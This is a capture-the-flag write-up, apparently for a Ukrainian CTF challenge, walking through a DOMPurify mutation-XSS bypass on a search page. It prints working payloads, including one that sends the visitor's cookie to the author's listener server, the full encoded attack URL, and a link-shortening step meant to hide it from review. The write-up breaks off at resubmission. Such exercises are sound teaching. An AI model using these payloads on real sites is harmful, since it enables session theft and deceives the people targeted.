# Purr-Purr

```
Якщо ви читали "Мистецтво обману" Кевіна Митника, то знаєте яка найбільша вразливість у кібербезпеці.
```

After following the [link](https://purr-purr.ua30ctf.org/) we get the landing page with a frog Mike

![Mike](./images/landing_page.png)

The first strange thing i noticed that search button is blocked by the image so i guessed that the exploitation would be related to this. 

After exploring a little bit we can also find the contact button that leads to _/contact.php_ endpoint where we can submit a link to someone, very interesting.

![Contact](./images/contact.png)

Also in the source code we can __DOMpurify.min.js__ file. For now just taking notes.

So if we can submit a url to someone that will read it, the first thing that comes to mind is vulnerable xss page with attacker's payload, so let's try it with search functionality.

![XSS](./images/xss.png)

![Filtered](./images/filter.png)

It got completely filtered out. And when we look at the source code we can se DOMpurify.sanitize in action.

The code responsible for that:

```
var searchinput = getURLParameter('searchinput');
// If we have search query
if (searchinput != null && searchinput != "") {

    // You shall not pass
    var clean = DOMPurify.sanitize(searchinput);
    $("#current_search").html(clean);
    //alert(searchinput);
    //alert(clean);
```

I tried several more payloads to see how it behaves but only several html injection payloads seemed to work that would not lead to any vulnerability. So i started to google about DOMPurify bypass and found an [article](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss). 

I use firefox so the last payload worked for me.

```
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

Now that we have XSS let's modify the payload to steal the cookie of whoever reads our url after the sumbition on the contact page.

```
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src&Tab;onerror=window.location.href='http://10.110.0.3:8000?cookie='+document.cookie;&gt;">
```

Where 10.110.0.3:8000 - our server. I used php, but you could use anything else such as python's http.server

```
[GMtranscendence] $ php -S 0.0.0.0:8000
[Fri Apr 28 20:11:28 2023] PHP 8.2.5 Development Server (http://0.0.0.0:8000) started
```

And we try to submit the following url that is automatically url encoded after we use the search functionality

```
https://purr-purr.ua30ctf.org/search.php?searchinput=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cimg+title%3D%22--%26gt%3B%26lt%3B%2Fmglyph%26gt%3B%26lt%3Bimg%26Tab%3Bsrc%26Tab%3Bonerror%3Dwindow.location.href%3D%27http%3A%2F%2F10.110.0.3%3A8000%3Fcookie%3D%27%2Bdocument.cookie%3B%26gt%3B%22%3E
```

![Submit](./images/xss_submit.png)

After that we can see the response 

![Response](./images/response.png)

Oh no, our link is too suspicious. Let's try to obfuscate it by shortening via bitly.com

```
https://bit.ly/426oVW9
```

And submit it again with fingers crossed








